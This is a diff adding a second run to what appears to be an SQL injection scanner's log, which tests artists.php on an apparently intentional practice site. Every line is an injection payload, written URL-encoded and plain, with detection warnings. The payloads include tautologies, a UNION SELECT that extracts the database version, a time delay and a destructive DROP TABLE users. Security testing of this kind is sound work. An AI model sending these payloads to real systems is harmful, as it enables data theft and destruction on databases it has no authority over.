@@ -34,3 +34,19 @@
 2025-01-25 14:02:02,399 - INFO - Testing URL: http://testphp.vulnweb.com/artists.php?artists=%27%3B+WAITFOR+DELAY+%270%3A0%3A10%27--
 2025-01-25 14:02:03,047 - WARNING - Possible vulnerability detected with payload: '; WAITFOR DELAY '0:0:10'--
 2025-01-25 14:02:03,047 - INFO - SQL injection tests completed.
+2025-01-25 15:36:04,576 - INFO - Starting SQL injection tests on http://testphp.vulnweb.com/artists.php
+2025-01-25 15:36:04,576 - INFO - Testing URL: http://testphp.vulnweb.com/artists.php?artists=%27+OR+%271%27%3D%271
+2025-01-25 15:36:05,438 - WARNING - Possible vulnerability detected with payload: ' OR '1'='1
+2025-01-25 15:36:05,440 - INFO - Testing URL: http://testphp.vulnweb.com/artists.php?artists=%27+OR+1%3D1--
+2025-01-25 15:36:06,048 - WARNING - Possible vulnerability detected with payload: ' OR 1=1--
+2025-01-25 15:36:06,049 - INFO - Testing URL: http://testphp.vulnweb.com/artists.php?artists=%27+OR+%271%27%3D%271%27+--
+2025-01-25 15:36:06,689 - WARNING - Possible vulnerability detected with payload: ' OR '1'='1' --
+2025-01-25 15:36:06,689 - INFO - Testing URL: http://testphp.vulnweb.com/artists.php?artists=%27+OR+1%3D1%23
+2025-01-25 15:36:07,274 - WARNING - Possible vulnerability detected with payload: ' OR 1=1#
+2025-01-25 15:36:07,274 - INFO - Testing URL: http://testphp.vulnweb.com/artists.php?artists=%27%3B+DROP+TABLE+users%3B+--
+2025-01-25 15:36:07,902 - WARNING - Possible vulnerability detected with payload: '; DROP TABLE users; --
+2025-01-25 15:36:07,903 - INFO - Testing URL: http://testphp.vulnweb.com/artists.php?artists=%27+UNION+SELECT+NULL%2C+version%28%29%2C+NULL--
+2025-01-25 15:36:08,507 - WARNING - Possible vulnerability detected with payload: ' UNION SELECT NULL, version(), NULL--
+2025-01-25 15:36:08,507 - INFO - Testing URL: http://testphp.vulnweb.com/artists.php?artists=%27%3B+WAITFOR+DELAY+%270%3A0%3A10%27--
+2025-01-25 15:36:09,098 - WARNING - Possible vulnerability detected with payload: '; WAITFOR DELAY '0:0:10'--
+2025-01-25 15:36:09,098 - INFO - SQL injection tests completed.
